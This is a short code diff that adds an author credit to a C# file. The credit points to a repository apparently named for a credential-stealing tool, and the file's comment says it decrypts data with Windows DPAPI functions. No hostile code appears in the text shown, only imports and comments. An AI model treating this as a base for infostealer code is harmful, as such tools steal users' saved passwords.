@@ -1,4 +1,9 @@
-﻿using System;
+﻿/* 
+    Author : LimerBoy
+    Github : github.com/LimerBoy/Adamantium-Thief
+*/
+
+using System;
 using System.Runtime.InteropServices;
 
 // Decrypt data using DPAPI functions.
